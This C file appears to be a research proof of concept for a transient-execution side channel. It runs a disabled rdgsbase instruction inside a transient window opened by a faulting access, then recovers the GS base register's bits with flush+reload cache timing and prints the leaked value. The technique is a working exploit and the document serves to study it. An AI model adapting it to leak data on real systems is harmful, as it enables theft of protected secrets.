#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <asm/prctl.h>
#include <sys/syscall.h>

//
// Code tested on: Intel Core i3-7100T and on AMD Epyc 7252
//

#include "cacheutils.h"

#define PAGESIZE 4096
#define IMUL_BLOCK asm volatile ("imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" : : "c"(7331) : "memory");

__attribute__((aligned(PAGESIZE)))
char testarray[PAGESIZE * 256];

// for dummy gsbase
__attribute__((aligned(PAGESIZE)))
char unused_array[PAGESIZE * 256];

void init() {
  memset(testarray, 1, 256 * PAGESIZE);

  CACHE_MISS = detect_flush_reload_threshold() - 10;
  printf("Cache miss @ %zd\n", CACHE_MISS);
  mfence();

  signal(SIGSEGV, trycatch_segfault_handler);
  //signal(SIGILL, trycatch_segfault_handler);
}

int is_rdgsbase_disabled() {
  int disabled = 1;
  if (!setjmp(trycatch_buf)) {
    asm volatile (INTELASM("rdgsbase rax") ::: "rax");
    disabled = 0;
    try_abort();
  }
  return disabled;
}

int main(int argc, char* argv[]) {
  init();

  if (!is_rdgsbase_disabled()) {
    printf("\033[91m[!] RDGSBASE is still executable from userspace. You need to disable that using the kernel command line 'nofsgsbase'!\033[0m\n");
    return 1;
  }

  printf("setting GSBASE to %p\n", unused_array);
  int ret = syscall(SYS_arch_prctl, ARCH_SET_GS, unused_array); 
  if (ret != 0) {
    printf("ret: %d (errno: %s)\n", ret, strerror(errno));
  }

  //size_t iterations = 5;
  size_t iterations = 5;
  //size_t spacing = 4096;
  size_t spacing = 4096;
  size_t tries = 200000;


  for (int experiment_repetitions = 0; experiment_repetitions < 3; experiment_repetitions++) {
    // flush testarray
    for (size_t c = 0; c < 255; c++) {
      flush(testarray + c * spacing);
    }
    mfence();

    uint64_t recovered_register = 0;

    for (int shift = 0; shift < (64 - 3 * 8); shift += 8) {
      int got_hit = 0;
      int last_hit = -1;
      int current_hit = -2;
      for (size_t try = 0; last_hit != current_hit; try++) {
        for (size_t i = 0; i < iterations; i++) {
          if (!setjmp(trycatch_buf)) {
            // try to leak some byte
            asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
            IMUL_BLOCK
            maccess(0);  // start transient window

            asm volatile(
            INTELASM(
              "xor rax, rax\n\t"
              //"add rax, 42\n\t"
              "mov ecx, %[shift]\n\t"
              "lea r11, [%[testarray]]\n\t"
              "rdgsbase rax\n\t"
              "shr rax, cl\n\t"  // this works as we only iterate until 64 - 3 * 8
              "and rax, 0xff000\n\t"
              "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
              "add r11, rax\n\t"
              "mov rax, [r11]\n\t"
              "xor rax, rax\n\t"
            )
            : : [testarray]"r"(&testarray), [shift]"r"(shift): "memory", "rdx", "rcx", "rax", "r11");
            try_abort();
          }
          unblock_signal(SIGSEGV);
        }  // for (size_t try = 0; try < tries; try++)

        // check for hits in array
        for (size_t i = 0; i < 255; i++) {
          size_t idx = ((i * 167u) + 13u) & 255u;
          size_t delta = flush_reload_t(testarray + idx * spacing);
          if (delta < CACHE_MISS) {
            if (idx != 0) {
              last_hit = current_hit;
              current_hit = idx - 1;
              got_hit++;
              // remember: we encoded the value incremented by one so we need to decrement again
              printf("shift %d: hit @ 0x%x\n", shift, idx - 1);
              if (last_hit == current_hit) {
                recovered_register |= (idx - 1) << (shift + 12);
              }
            }
          }
        }
      }  // for (size_t i = 0; i < iterations; i++)
    }
    printf("===================================\n");
    printf("Leaked Value: 0x%lx\n", recovered_register);
  } // experiment repetitions

  return 0;
}
